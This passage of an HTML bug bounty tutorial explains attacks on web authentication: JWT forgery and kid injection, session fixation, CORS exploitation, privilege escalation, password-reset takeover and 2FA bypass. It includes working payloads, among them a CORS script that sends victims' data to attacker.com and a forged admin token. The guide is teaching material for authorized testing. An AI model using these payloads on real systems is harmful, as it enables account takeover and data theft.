+{ <span class="str">"user_id"</span>: <span class="str">"1234"</span>, <span class="str">"role"</span>: <span class="str">"user"</span>, <span class="str">"exp"</span>: <span class="flag">1709000000</span> }</div>
+
+            <h3>The "none" Algorithm Attack</h3>
+            <p>
+                The JWT specification defines an <code>alg</code> value of <code>"none"</code> for
+                unsigned tokens, intended for contexts where integrity is guaranteed by other means
+                (e.g., transport-layer security in trusted environments). If the server's JWT library
+                accepts <code>"none"</code> as a valid algorithm, an attacker can strip the signature,
+                set the algorithm to <code>"none"</code>, modify any claims (change role to admin, change
+                user_id to another user), and submit the token with an empty signature. The server
+                verifies the empty signature against the "none" algorithm and accepts it.
+            </p>
+            <div class="code-block"><span class="comment"># Original JWT header</span>
+{ <span class="str">"alg"</span>: <span class="str">"HS256"</span>, <span class="str">"typ"</span>: <span class="str">"JWT"</span> }
+
+<span class="comment"># Modified header &mdash; "none" algorithm attack</span>
+{ <span class="str">"alg"</span>: <span class="flag">"none"</span>, <span class="str">"typ"</span>: <span class="str">"JWT"</span> }
+
+<span class="comment"># Modified payload &mdash; escalate to admin</span>
+{ <span class="str">"user_id"</span>: <span class="str">"1234"</span>, <span class="str">"role"</span>: <span class="flag">"admin"</span>, <span class="str">"exp"</span>: <span class="flag">9999999999</span> }
+
+<span class="comment"># Final token: base64(header).base64(payload). (empty signature)</span>
+<span class="kw">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMTIzNCIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.</span></div>
+
+            <h3>Algorithm Confusion (RS256 to HS256)</h3>
+            <p>
+                RS256 uses asymmetric cryptography: the server signs tokens with a private key and
+                verifies them with a public key. HS256 uses symmetric cryptography: the same secret
+                key signs and verifies. In the algorithm confusion attack, the attacker changes the
+                header algorithm from <code>RS256</code> to <code>HS256</code> and signs the token
+                using the server's public key (which is publicly available) as the HMAC secret. If the
+                server's JWT library blindly trusts the algorithm in the header, it uses the public key
+                as the HMAC key to verify, and the signature passes validation.
+            </p>
+            <div class="code-block"><span class="comment"># Step 1: Obtain the server's RSA public key (often at /jwks.json or /.well-known/jwks.json)</span>
+<span class="cmd">curl</span> https://target.com/.well-known/jwks.json
+
+<span class="comment"># Step 2: Convert JWKS to PEM format</span>
+<span class="comment"># Step 3: Change header to HS256 and sign with the public key as HMAC secret</span>
+<span class="cmd">python3</span> jwt_tool.py &lt;token&gt; <span class="flag">-X k -pk public_key.pem</span>
+
+<span class="comment"># The server's verify function sees alg=HS256, uses the "secret" (public key) to verify HMAC</span>
+<span class="comment"># Since we signed with that same public key, the signature matches</span></div>
+
+            <h3>JWK Header Injection</h3>
+            <p>
+                The JWT header can include a <code>jwk</code> parameter that embeds the signing key
+                directly in the token. If the server trusts the embedded key without verifying it
+                against a whitelist, the attacker generates their own RSA key pair, signs the token
+                with their private key, and embeds their public key in the <code>jwk</code> header.
+                The server extracts the embedded key and uses it to verify the signature &mdash;
+                which naturally passes because the attacker signed with the corresponding private key.
+            </p>
+
+            <h3>JWKS Spoofing</h3>
+            <p>
+                Some servers fetch the signing key from a URL specified in the <code>jku</code> (JWK
+                Set URL) header parameter. The attacker hosts a malicious JWKS endpoint containing their
+                own public key, modifies the <code>jku</code> header to point to their server, and signs
+                the token with their private key. If the server fetches the JWKS from the
+                attacker-controlled URL without validating the domain, the forged signature verifies
+                successfully.
+            </p>
+
+            <h3>kid Parameter Injection</h3>
+            <p>
+                The <code>kid</code> (Key ID) header identifies which key in a set should be used for
+                verification. If the server uses the <code>kid</code> value to construct a file path or
+                database query without sanitization, it becomes an injection vector. Path traversal in
+                <code>kid</code> can point the server to a known file (e.g., <code>/dev/null</code> or
+                a public file) and the attacker signs with the contents of that file as the key. SQL
+                injection in <code>kid</code> can extract the signing secret from the database.
+            </p>
+            <div class="code-block"><span class="comment"># kid path traversal &mdash; use /dev/null as the signing key (empty string)</span>
+{
+  <span class="str">"alg"</span>: <span class="str">"HS256"</span>,
+  <span class="str">"typ"</span>: <span class="str">"JWT"</span>,
+  <span class="str">"kid"</span>: <span class="flag">"../../../../../../dev/null"</span>
+}
+
+<span class="comment"># kid SQL injection &mdash; force the key lookup to return a known value</span>
+{
+  <span class="str">"alg"</span>: <span class="str">"HS256"</span>,
+  <span class="str">"typ"</span>: <span class="str">"JWT"</span>,
+  <span class="str">"kid"</span>: <span class="flag">"' UNION SELECT 'known-secret-value' -- "</span>
+}</div>
+
+            <h3>JWT Claim Manipulation</h3>
+            <p>
+                Even when the signature cannot be forged, other JWT weaknesses exist. Check whether the
+                server validates the <code>exp</code> (expiration) claim &mdash; some implementations
+                accept expired tokens. Test whether the <code>aud</code> (audience) claim is validated
+                &mdash; a token issued for one service may be accepted by another. Test whether the
+                <code>iss</code> (issuer) claim is verified. Modify non-critical claims to test for
+                privilege escalation: change <code>"role":"user"</code> to <code>"role":"admin"</code>,
+                change <code>"is_admin":false</code> to <code>"is_admin":true</code>, or change
+                <code>"subscription":"free"</code> to <code>"subscription":"enterprise"</code>.
+            </p>
+
+            <h3>Tools</h3>
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">jwt_tool</div>
+                    <div class="tool-role">JWT Attack Suite</div>
+                    <div class="tool-desc">Python tool for testing all JWT attacks: none algorithm, key
+                    confusion, JWK injection, JWKS spoofing, kid injection, claim tampering, and brute-force
+                    of weak HMAC secrets. The <code>-M at</code> flag runs all known attack modes automatically.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">jwt.io</div>
+                    <div class="tool-role">Online Decoder</div>
+                    <div class="tool-desc">Browser-based JWT decoder and debugger. Paste a token to view the
+                    decoded header and payload instantly. Useful for quick inspection during testing but do
+                    not paste production tokens containing secrets into any online tool.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Burp JWT Editor</div>
+                    <div class="tool-role">Burp Suite Extension</div>
+                    <div class="tool-desc">Burp extension that adds a JWT tab to the message editor.
+                    Decode, modify, and re-sign tokens directly within Burp. Supports all attack variants
+                    including algorithm confusion and embedded JWK attacks.</div>
+                </div>
+            </div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">Algorithm Confusion Prevalence</div>
+                    <div class="callout-text">Algorithm confusion attacks are less common in 2025+ because
+                    modern JWT libraries default to strict algorithm verification. However, custom JWT
+                    implementations, legacy systems, and applications that pass the algorithm from the
+                    token header directly to the verify function remain vulnerable. Always test for it.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== SECTION 04: Session Management Attacks ==================== -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128271;</span>
+            Session Management Attacks
+        </h2>
+        <div class="section-body">
+            <p>
+                Session management is the mechanism by which a server tracks the state of an
+                authenticated user across multiple HTTP requests. The session identifier &mdash;
+                typically stored in a cookie &mdash; is the single credential that represents the user's
+                authenticated state. Any weakness in how sessions are created, transmitted, stored, or
+                invalidated can lead to session hijacking and full account compromise.
+            </p>
+
+            <h3>Session Fixation</h3>
+            <p>
+                In a session fixation attack, the attacker obtains a valid session identifier from the
+                server (by visiting the login page as an unauthenticated user), then tricks the victim
+                into authenticating with that same session identifier. If the server does not regenerate
+                the session ID upon successful authentication, the attacker's pre-set session ID becomes
+                associated with the victim's authenticated session, granting the attacker full access.
+            </p>
+            <div class="code-block"><span class="comment"># Step 1: Attacker obtains session ID from the server</span>
+<span class="cmd">GET</span> /login HTTP/1.1
+<span class="comment"># Response: Set-Cookie: SESSIONID=attacker_known_value</span>
+
+<span class="comment"># Step 2: Attacker sends victim a link with the fixed session</span>
+https://target.com/login?SESSIONID=<span class="flag">attacker_known_value</span>
+
+<span class="comment"># Step 3: Victim logs in; server does NOT regenerate session ID</span>
+<span class="comment"># Step 4: Attacker uses SESSIONID=attacker_known_value &mdash; now authenticated as victim</span></div>
+
+            <h3>Session Hijacking via XSS</h3>
+            <p>
+                If session cookies are not protected with the <code>HttpOnly</code> flag, a cross-site
+                scripting vulnerability allows the attacker to extract the session cookie via
+                <code>document.cookie</code> and transmit it to their server. Even with <code>HttpOnly</code>
+                set, an attacker with XSS can perform actions as the victim by making authenticated
+                requests directly from the victim's browser, bypassing the need to steal the cookie.
+            </p>
+
+            <h3>Cookie Security Flags</h3>
+            <p>
+                Every session cookie should be evaluated against three critical security flags. Missing
+                or misconfigured flags are reportable findings, especially when combined with other
+                weaknesses.
+            </p>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Flag</th>
+                        <th>Purpose</th>
+                        <th>Attack When Missing</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">HttpOnly</td>
+                        <td>Prevents JavaScript from accessing the cookie via <code>document.cookie</code></td>
+                        <td>XSS allows direct session cookie theft</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Secure</td>
+                        <td>Cookie is only transmitted over HTTPS, never over plaintext HTTP</td>
+                        <td>MITM on HTTP can intercept session cookies in transit</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">SameSite</td>
+                        <td>Controls whether the cookie is sent with cross-origin requests (Strict, Lax, None)</td>
+                        <td>CSRF attacks can use the victim's session for state-changing requests</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Predictable Session Tokens</h3>
+            <p>
+                Session identifiers must be generated using a cryptographically secure random number
+                generator with sufficient entropy (at least 128 bits). If the session token follows a
+                predictable pattern &mdash; sequential integers, timestamps, or weak hashing of
+                predictable inputs &mdash; an attacker can compute valid session tokens for other users.
+                Test by collecting multiple session tokens, analyzing them for patterns (Burp Sequencer
+                is purpose-built for this), and checking whether any portion is deterministic.
+            </p>
+
+            <h3>Session Puzzling</h3>
+            <p>
+                Session puzzling (also called session variable overloading) occurs when the same session
+                variable is used for different purposes across different parts of the application. For
+                example, a password reset flow might store the target user's ID in the session. If the
+                login flow also reads the user ID from the session without clearing it, an attacker can
+                initiate a password reset for the victim, then navigate to the login endpoint to be
+                authenticated as the victim. Test by mapping all session variables across every flow
+                (login, registration, password reset, 2FA) and checking for shared or overloaded
+                variable names.
+            </p>
+
+            <h3>Concurrent Session Handling</h3>
+            <p>
+                Test what happens when a user logs in from multiple devices simultaneously. Does the
+                server enforce a maximum number of concurrent sessions? When the user changes their
+                password, are existing sessions invalidated? When the user logs out on one device, does
+                it affect sessions on other devices? Failure to invalidate sessions after credential
+                change means a compromised session remains valid indefinitely, even after the user
+                "recovers" their account.
+            </p>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#9432;</span>
+                <div>
+                    <div class="callout-title">Session Testing Checklist</div>
+                    <div class="callout-text">For every target, verify: (1) Session ID regenerates after
+                    login. (2) Session ID regenerates after privilege change. (3) Session invalidates on
+                    logout. (4) Session invalidates on password change. (5) Cookie has HttpOnly, Secure,
+                    and SameSite flags. (6) Session tokens have sufficient entropy (use Burp Sequencer).
+                    (7) Concurrent sessions are controlled. (8) Session timeout is enforced.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== SECTION 05: CORS Exploitation ==================== -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#127760;</span>
+            CORS Exploitation
+        </h2>
+        <div class="section-body">
+            <p>
+                Cross-Origin Resource Sharing (CORS) is a mechanism that relaxes the Same-Origin Policy
+                (SOP) to allow controlled cross-domain communication. The SOP prevents a script on
+                <code>evil.com</code> from reading the response of a request to <code>bank.com</code>.
+                CORS headers tell the browser which origins are allowed to read responses. When CORS is
+                misconfigured, an attacker's website can make authenticated requests to the target and
+                read the responses, exfiltrating sensitive data.
+            </p>
+
+            <h3>Same-Origin Policy Basics</h3>
+            <p>
+                Two URLs have the same origin if they share the same scheme (http/https), host, and
+                port. The SOP restricts how a document or script loaded from one origin can interact
+                with resources from another origin. JavaScript on <code>https://evil.com</code> can
+                send a cross-origin request to <code>https://api.target.com</code>, but the browser
+                blocks the script from reading the response unless the response includes permissive
+                CORS headers.
+            </p>
+
+            <h3>CORS Header Analysis</h3>
+            <p>
+                The key headers to examine are <code>Access-Control-Allow-Origin</code> (which origins
+                can read the response), <code>Access-Control-Allow-Credentials</code> (whether cookies
+                are included), and <code>Access-Control-Allow-Methods</code> (which HTTP methods are
+                permitted). The vulnerability arises when the server reflects a controlled origin
+                and allows credentials simultaneously.
+            </p>
+            <div class="code-block"><span class="comment"># Test: Send a request with an arbitrary Origin header</span>
+<span class="cmd">curl</span> -H <span class="str">"Origin: https://evil.com"</span> -I https://api.target.com/user/profile
+
+<span class="comment"># Check the response headers:</span>
+Access-Control-Allow-Origin: <span class="flag">https://evil.com</span>        <span class="comment"># Reflected! Vulnerable.</span>
+Access-Control-Allow-Credentials: <span class="flag">true</span>               <span class="comment"># Cookies sent. Critical.</span>
+
+<span class="comment"># Safe response would be:</span>
+Access-Control-Allow-Origin: <span class="str">https://app.target.com</span>   <span class="comment"># Hardcoded whitelist.</span></div>
+
+            <h3>Exploitable CORS Misconfigurations</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Misconfiguration</th>
+                        <th>Severity</th>
+                        <th>How to Test</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Reflect Origin</td>
+                        <td><span class="badge badge-legacy">Critical</span></td>
+                        <td>Send <code>Origin: https://evil.com</code>. If ACAO reflects it and ACAC is true, any
+                        attacker site can read authenticated responses.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">null Origin</td>
+                        <td><span class="badge badge-legacy">High</span></td>
+                        <td>Send <code>Origin: null</code>. Sandboxed iframes and data: URIs send a null origin.
+                        If ACAO reflects <code>null</code> with credentials, exploit via a sandboxed iframe.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Wildcard + Credentials</td>
+                        <td><span class="badge badge-current">Medium</span></td>
+                        <td>ACAO is <code>*</code> and ACAC is true. Browsers reject this combination, but
+                        some custom HTTP clients and mobile apps do not. Test non-browser clients.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Regex Bypass</td>
+                        <td><span class="badge badge-legacy">High</span></td>
+                        <td>Send <code>Origin: https://target.com.evil.com</code> or
+                        <code>Origin: https://eviltarget.com</code>. Weak regex that checks if the
+                        origin "contains" or "ends with" the trusted domain will match.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>CORS Exploitation PoC Script</h3>
+            <p>
+                When you confirm a reflective CORS misconfiguration with credentials, the PoC is a
+                simple HTML page hosted on the attacker's domain that makes an authenticated request
+                and reads the response.
+            </p>
+            <div class="code-block"><span class="comment">&lt;!-- CORS exploitation PoC &mdash; host on attacker.com --&gt;</span>
+&lt;<span class="kw">script</span>&gt;
+  <span class="kw">var</span> xhr = <span class="kw">new</span> XMLHttpRequest();
+  xhr.open(<span class="str">'GET'</span>, <span class="str">'https://api.target.com/user/profile'</span>, <span class="kw">true</span>);
+  xhr.withCredentials = <span class="kw">true</span>;
+  xhr.onreadystatechange = <span class="kw">function</span>() {
+    <span class="kw">if</span> (xhr.readyState === 4) {
+      <span class="comment">// Send stolen data to attacker's server</span>
+      <span class="kw">var</span> exfil = <span class="kw">new</span> XMLHttpRequest();
+      exfil.open(<span class="str">'POST'</span>, <span class="str">'https://attacker.com/log'</span>, <span class="kw">true</span>);
+      exfil.send(xhr.responseText);
+    }
+  };
+  xhr.send();
+&lt;/<span class="kw">script</span>&gt;</div>
+
+            <h3>Real-World CORS Bounties</h3>
+            <p>
+                CORS misconfigurations that reflect arbitrary origins with credentials and expose
+                sensitive data (PII, tokens, financial data) typically pay $1,000&ndash;$5,000 on major
+                platforms. The payout depends on the sensitivity of the data accessible via the
+                misconfigured endpoint. A CORS misconfiguration on a marketing page that returns no
+                sensitive data is informational. The same misconfiguration on <code>/api/user/profile</code>
+                that returns email, name, and API keys is high-severity. Always demonstrate the impact
+                by showing the exact data an attacker can exfiltrate.
+            </p>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#9432;</span>
+                <div>
+                    <div class="callout-title">Testing Shortcut</div>
+                    <div class="callout-text">Use Burp's "Add custom header" match/replace rule to add
+                    <code>Origin: https://evil.com</code> to every request automatically. Then review
+                    all responses for reflected ACAO headers with credentials. This turns CORS testing
+                    from a manual hunt into passive discovery.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== SECTION 06: Privilege Escalation Patterns ==================== -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9875;</span>
+            Privilege Escalation Patterns
+        </h2>
+        <div class="section-body">
+            <p>
+                Privilege escalation in web applications occurs when a user gains access to resources
+                or functionality beyond their intended authorization level. This is distinct from
+                authentication bypass (where the attacker is not authenticated at all) &mdash; privilege
+                escalation assumes the attacker has a valid, authenticated session but abuses flaws
+                in the authorization layer to expand their permissions.
+            </p>
+
+            <h3>Horizontal Privilege Escalation</h3>
+            <p>
+                Horizontal escalation means accessing another user's resources at the same privilege
+                level. This overlaps significantly with IDOR but extends beyond simple object references.
+                Horizontal escalation includes accessing another user's dashboard by modifying a cookie
+                value, viewing another team's project by changing a workspace ID in the session,
+                or reading another customer's support tickets by manipulating API query filters.
+            </p>
+
+            <h3>Vertical Privilege Escalation</h3>
+            <p>
+                Vertical escalation means gaining a higher privilege level than assigned &mdash; a regular
+                user performing admin actions, a read-only user gaining write access, or a free-tier
+                user accessing enterprise features. Vertical escalation is consistently rated high to
+                critical severity because it compromises the entire authorization model.
+            </p>
+
+            <h3>Missing Function-Level Access Control</h3>
+            <p>
+                This vulnerability occurs when the application enforces access control in the UI
+                (hiding buttons, removing menu items) but not on the server. The admin panel button is
+                hidden from regular users, but navigating directly to <code>/admin/dashboard</code>
+                works. The "delete user" button is absent from the regular user's interface, but sending
+                a <code>DELETE /api/users/1234</code> request succeeds because the endpoint lacks an
+                authorization check.
+            </p>
+
+            <ul class="numbered-list">
+                <li>Enumerate all endpoints by reviewing JavaScript source files, API documentation, and Swagger/OpenAPI definitions. Build a complete map of every endpoint the application exposes.</li>
+                <li>Test every endpoint with sessions at each privilege level: unauthenticated, regular user, moderator, admin. Record which requests succeed and which return 401/403.</li>
+                <li>Pay special attention to endpoints that perform destructive or administrative actions: user management, configuration changes, data export, billing modifications, and audit log access.</li>
+                <li>Test HTTP method variations. An endpoint may enforce authorization on POST but not on PUT, PATCH, or OPTIONS. Some frameworks have different middleware chains for different methods.</li>
+                <li>Check for parameter-based role elevation: adding <code>&amp;admin=true</code>, <code>&amp;role=admin</code>, or <code>{"is_admin": true}</code> to requests. Some applications trust client-supplied role indicators.</li>
+            </ul>
+
+            <h3>Forced Browsing to Admin Endpoints</h3>
+            <p>
+                Forced browsing means directly requesting URLs that are not linked in the application's
+                UI but exist on the server. Common admin paths include <code>/admin</code>,
+                <code>/console</code>, <code>/management</code>, <code>/internal</code>,
+                <code>/debug</code>, <code>/api/admin</code>, and <code>/graphql</code> (with
+                introspection enabled). Tools like ffuf, feroxbuster, and gobuster with admin-focused
+                wordlists are effective for discovering these endpoints.
+            </p>
+            <div class="code-block"><span class="comment"># Forced browsing with ffuf &mdash; discover admin endpoints</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> https://target.com/<span class="flag">FUZZ</span> \
+     <span class="flag">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+     <span class="flag">-H</span> <span class="str">"Cookie: session=regular_user_session"</span> \
+     <span class="flag">-mc</span> 200,301,302,403 \
+     <span class="flag">-fc</span> 404
+
+<span class="comment"># Check API versioning &mdash; older API versions may lack auth</span>
+<span class="cmd">curl</span> https://api.target.com/<span class="flag">v1</span>/admin/users   <span class="comment"># v2 enforces auth, v1 does not</span></div>
+
+            <h3>Role Manipulation in Requests</h3>
+            <p>
+                Some applications include role or permission data in the request itself &mdash; in
+                cookies, JWT claims, hidden form fields, or API parameters. If the server trusts these
+                client-supplied values without server-side validation, the attacker can elevate their
+                privileges by modifying them. Test by intercepting registration and profile update
+                requests and adding role-related fields. Test by decoding JWT tokens and modifying
+                role claims (covered in Section 03). Test by modifying cookie values that contain
+                role identifiers (e.g., <code>role=user</code> to <code>role=admin</code>).
+            </p>
+
+            <h3>Multi-Step Privilege Escalation Chains</h3>
+            <p>
+                The highest-impact findings often involve chaining multiple lower-severity issues into
+                a privilege escalation chain. A self-XSS (normally out of scope) combined with a CSRF
+                that forces the victim to trigger the XSS, which then steals an admin's session token,
+                which grants admin access &mdash; that chain is critical. An IDOR that reveals an
+                admin's email, combined with a password reset flaw that allows resetting any account
+                by email, combined with a 2FA bypass &mdash; each step escalates the impact.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#9881;</div>
+                    <div class="concept-card-title">Information Disclosure &#8594; IDOR</div>
+                    <div class="concept-card-body">
+                        An endpoint leaks user IDs or UUIDs. Another endpoint has an IDOR that accepts
+                        those IDs. The information disclosure enables mass exploitation of the IDOR.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#9881;</div>
+                    <div class="concept-card-title">IDOR &#8594; Account Takeover</div>
+                    <div class="concept-card-body">
+                        An IDOR in the email update endpoint allows changing another user's email. The
+                        attacker changes the victim's email to their own, then uses password reset to
+                        gain full access.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#9881;</div>
+                    <div class="concept-card-title">XSS &#8594; Session Theft &#8594; Admin</div>
+                    <div class="concept-card-body">
+                        A stored XSS in a support ticket is viewed by an admin. The XSS steals the admin's
+                        session cookie. The attacker uses the admin session to access admin functionality.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#9881;</div>
+                    <div class="concept-card-title">CORS &#8594; Token Theft &#8594; Escalation</div>
+                    <div class="concept-card-body">
+                        A CORS misconfiguration allows reading API responses cross-origin. The attacker's
+                        page reads the victim's API key from the profile endpoint, then uses the API key
+                        for unauthorized actions.
+                    </div>
+                </div>
+            </div>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#9432;</span>
+                <div>
+                    <div class="callout-title">Chaining Increases Payouts</div>
+                    <div class="callout-text">Programs consistently pay more for demonstrated chains than
+                    for individual low-severity findings. A single IDOR that exposes a user's display name
+                    might be a $100 finding. That same IDOR chained to account takeover is a $5,000+
+                    finding. Always explore what you can chain before submitting.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== SECTION 07: Password Reset & Account Takeover ==================== -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128275;</span>
+            Password Reset &amp; Account Takeover
+        </h2>
+        <div class="section-body">
+            <p>
+                Password reset flows are one of the most productive attack surfaces for account takeover
+                in bug bounty. The reset flow must generate a token, deliver it to the legitimate user,
+                and verify it upon return &mdash; each step introduces potential weaknesses. Account
+                takeover (ATO) is the ultimate goal: gaining persistent access to another user's account.
+                ATO findings consistently receive the highest severity ratings and payouts.
+            </p>
+
+            <h3>Password Reset Token Prediction</h3>
+            <p>
+                The reset token must be cryptographically random and sufficiently long. If the token is
+                derived from predictable values &mdash; a timestamp, the user's email address, a
+                sequential counter, or a weak hash of these inputs &mdash; the attacker can compute
+                valid tokens without access to the victim's email. Test by requesting multiple reset
+                tokens and analyzing them for patterns. Check if the token is a Base64-encoded
+                timestamp, a UUID v1 (which contains a timestamp component), or a short numeric code
+                vulnerable to brute-force.
+            </p>
+            <div class="code-block"><span class="comment"># Collect multiple reset tokens and analyze</span>
+Token 1: <span class="flag">MTcwOTAwMDAwMC0xMjM0</span>  <span class="comment"># Base64 decode: 1709000000-1234</span>
+Token 2: <span class="flag">MTcwOTAwMDA2MC0xMjM1</span>  <span class="comment"># Base64 decode: 1709000060-1235</span>
+
+<span class="comment"># Pattern: Unix timestamp + sequential user ID</span>
+<span class="comment"># Attacker can predict token for any user if they know the user ID and request time</span>
+
+<span class="comment"># Short numeric code brute-force</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> https://target.com/reset?token=<span class="flag">FUZZ</span> \
+     <span class="flag">-w</span> /path/to/6digit-codes.txt \
+     <span class="flag">-mc</span> 200 <span class="flag">-fr</span> <span class="str">"invalid"</span></div>
+
+            <h3>Host Header Injection in Reset Emails</h3>
+            <p>
+                When an application generates a password reset link, it constructs the URL using the
+                <code>Host</code> header from the request. If the application does not validate the
+                Host header, an attacker can trigger a password reset for the victim and inject a
+                malicious Host header pointing to their own server. The reset email sent to the victim
+                contains a link to the attacker's domain with the valid reset token. When the victim
+                clicks the link (or when email security scanners pre-fetch it), the attacker captures
+                the token.
+            </p>
+            <div class="code-block"><span class="comment"># Host header injection in password reset</span>
+<span class="cmd">POST</span> /forgot-password HTTP/1.1
+Host: <span class="flag">attacker.com</span>
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@target.com
+
+<span class="comment"># Victim receives email with link:</span>
+<span class="comment"># https://attacker.com/reset?token=VALID_TOKEN</span>
+
+<span class="comment"># Alternative: X-Forwarded-Host header</span>
+<span class="cmd">POST</span> /forgot-password HTTP/1.1
+Host: target.com
+<span class="flag">X-Forwarded-Host: attacker.com</span>
+
+<span class="comment"># Some applications prefer X-Forwarded-Host over Host for link generation</span></div>
+
+            <h3>Response Manipulation</h3>
+            <p>
+                Some applications implement password reset verification on the client side. The server
+                returns a JSON response with a status field, and the client JavaScript decides whether
+                to display the "set new password" form based on the status value. An attacker can
+                intercept the response in Burp and change <code>{"status":"invalid"}</code> to
+                <code>{"status":"valid"}</code> to bypass token verification. While the server should
+                still enforce the token on the final password change request, many applications do not
+                re-verify at that stage.
+            </p>
+
+            <h3>Race Conditions in Verification</h3>
+            <p>
+                Race conditions in password reset flows arise when the server does not properly
+                serialize token validation and password update operations. An attacker sends multiple
+                simultaneous requests to the password change endpoint with the same reset token. If the
+                server checks "is this token valid?" and "invalidate this token" as separate operations
+                without proper locking, multiple requests may pass the validation check before any of
+                them invalidate the token. This can allow reuse of a single-use token.
+            </p>
+            <div class="code-block"><span class="comment"># Race condition &mdash; send multiple simultaneous requests with the same token</span>
+<span class="comment"># Using Burp Turbo Intruder or parallel curl</span>
+<span class="kw">for</span> i <span class="kw">in</span> $(seq 1 50); <span class="kw">do</span>
+  <span class="cmd">curl</span> -X POST https://target.com/reset-password \
+    -d <span class="str">"token=RESET_TOKEN&amp;new_password=hacked123"</span> &amp;
+<span class="kw">done</span>
+<span class="cmd">wait</span>
+
+<span class="comment"># If multiple requests succeed with the same token, the server has a TOCTOU race condition</span></div>
+
+            <h3>Account Takeover Chains</h3>
+            <p>
+                Account takeover is rarely a single-step vulnerability. It is typically a chain of two
+                or three findings that, together, grant persistent access to the victim's account. The
+                most common chains involve:
+            </p>
+            <ul>
+                <li>IDOR in email change + password reset = full ATO (change the victim's email to yours, then reset the password)</li>
+                <li>Host header poisoning + social engineering = token capture (victim clicks the poisoned reset link)</li>
+                <li>OAuth misconfiguration + account linking = silent ATO (link attacker's OAuth account to victim's profile)</li>
+                <li>Subdomain takeover + cookie scope = session theft (claim an abandoned subdomain, receive cookies scoped to the parent domain)</li>
+                <li>XSS + password change without current password = silent ATO (XSS payload changes the password directly)</li>
+            </ul>
+
+            <h3>2FA Bypass Techniques</h3>
+            <p>
+                Two-factor authentication adds a second layer of security, but its implementation often
+                contains bypassable weaknesses. These are not attacks on the cryptographic mechanisms
+                themselves but on the implementation logic.
+            </p>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-title">Response Manipulation</span>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>The server returns a status code or JSON field indicating whether the 2FA code is
+                    correct. Intercepting and modifying the response from <code>{"success": false}</code>
+                    to <code>{"success": true}</code> or changing a 403 status to 200 may bypass the check
+                    if the client trusts the response status and proceeds to the authenticated state.</p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-title">Backup Code Brute-Force</span>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>Backup codes are typically 8-character alphanumeric strings, but some applications
+                    use shorter numeric codes. If the application does not rate-limit backup code attempts
+                    or lock the account after failed tries, brute-force is feasible for shorter codes.
+                    Test with Burp Intruder or Turbo Intruder to determine the rate limit threshold.</p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-title">Direct Navigation Bypass</span>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>After entering the username and password, the application redirects to a 2FA
+                    verification page. However, if the authenticated session is already created at the
+                    password stage (before 2FA verification), directly navigating to the dashboard URL
+                    bypasses the 2FA step entirely. The session is valid; the 2FA page is just a
+                    client-side gate.</p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-title">SMS Interception Concepts</span>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>SMS-based 2FA is considered the weakest form because of SIM swapping attacks,
+                    SS7 protocol vulnerabilities, and malicious mobile apps that read incoming SMS. While
+                    exploiting these in a bug bounty context is out of scope (you cannot SIM swap someone),
+                    understanding the weakness informs your reporting: recommending TOTP or hardware keys
+                    over SMS is a valid security improvement suggestion.</p>
